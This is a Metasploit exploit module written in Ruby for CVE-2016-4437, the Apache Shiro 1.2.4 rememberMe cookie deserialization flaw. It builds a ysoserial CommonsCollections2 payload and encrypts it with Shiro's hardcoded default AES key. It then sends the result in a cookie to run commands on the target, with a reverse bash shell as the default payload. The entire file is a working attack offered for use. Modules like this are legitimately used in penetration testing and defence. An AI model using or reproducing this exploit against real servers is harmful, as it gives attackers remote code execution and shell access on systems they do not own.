# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Shiro v1.2.4 Cookie RememberME Deserial RCE&#039;,
      &#039;Description&#039;    => %q{
        This vulnerability allows remote attackers to execute arbitrary code on vulnerable
        installations of Apache Shiro v1.2.4.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
            &#039;L / l-codes[at]qq.com&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
            [&#039;CVE&#039;, &#039;2016-4437&#039;],
            [&#039;URL&#039;, &#039;https://github.com/Medicean/VulApps/tree/master/s/shiro/1&#039;]
        ],
      &#039;Platform&#039;       => %w{ win unix },
      &#039;Arch&#039;           => [ ARCH_CMD ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Unix Command payload&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039;}
          ],
          [
            &#039;Windows Command payload&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;win&#039;
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 7 2016&#039;,
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;   => 5
        }
      )
    )
    register_options(
    [
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base directory path&#039;, &#039;/&#039;])
    ])
  end

  def aes_encrypt(payload)
    aes = OpenSSL::Cipher.new(&#039;aes-128-cbc&#039;)
    aes.encrypt
    aes.key = Rex::Text.decode_base64(&#039;kPH+bIxk5D2deZiIxcaaaA==&#039;)
    aes.random_iv + aes.update(payload) + aes.final
  end

  def exploit
    cmd = payload.encoded
    vprint_status("Execute CMD: #{cmd}")
    type = ( target.name == &#039;Unix Command payload&#039; ? &#039;bash&#039; : &#039;cmd&#039; )
    java_payload = ::Msf::Util::JavaDeserialization.ysoserial_payload(&#039;CommonsCollections2&#039;, cmd, modified_type: type)
    ciphertext = aes_encrypt(java_payload)
    base64_ciphertext = Rex::Text.encode_base64(ciphertext)

    send_request_cgi({
      &#039;uri&#039;      => target_uri.path,
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;cookie&#039;   => "rememberMe=#{base64_ciphertext}"
    })
  end

end

